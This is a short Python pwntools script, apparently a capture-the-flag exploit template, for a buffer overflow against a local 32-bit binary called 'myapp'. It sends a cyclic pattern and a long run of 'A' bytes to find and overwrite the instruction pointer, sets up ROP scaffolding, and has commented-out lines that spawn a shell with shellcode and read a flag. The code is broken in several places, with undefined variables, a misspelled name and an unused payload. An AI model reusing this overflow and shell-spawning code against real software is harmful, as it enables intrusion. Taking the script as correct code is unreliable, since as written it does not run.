#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = 'myapp'



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


def find_ip(payload):
    p = process(exe)
    print(io.recvline())
    print(io.recvline())
    io.sendline(cyclic(200))
    print(io.recvline())
    p.wait()
    ip_offset = cyclic.find(p.corefile.pc)
    print(ip_offcet)
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


io = start()
offset = 153
payload = flat(
        "A"*offset
        )
rop = ROP(elf)
rop.main()
print(io.recvline())
print(io.recvline())
io.sendline("A"*200)
print(io.recvline())
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

